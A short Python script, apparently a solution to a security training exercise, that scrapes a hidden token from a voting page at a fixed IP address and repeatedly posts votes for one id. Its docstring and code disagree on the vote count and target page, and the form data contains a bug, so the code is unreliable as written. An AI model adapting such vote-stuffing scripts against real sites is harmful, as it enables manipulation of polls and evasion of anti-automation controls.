#!/usr/bin/python3
"""
	This is a script that votes 1024 times
	for your id here: http://158.69.76.135/level0.php.
"""

import requests
from bs4 import BeautifulSoup

URL = "http://158.69.76.135/level1.php"
amount_votes = 3
with requests.session() as session:
	for i in range(amount_votes):
		r = session.get(URL)
		index = r.text.find("value")
		token = r.text[index+6:index+48]
		print(token)
		soup = BeautifulSoup(r.text, "html.parser")
		credentials = {"id": 1, "holdthedoor": "submit", "key"==token: "hidden"}
		vote = session.post(URL, data=credentials)
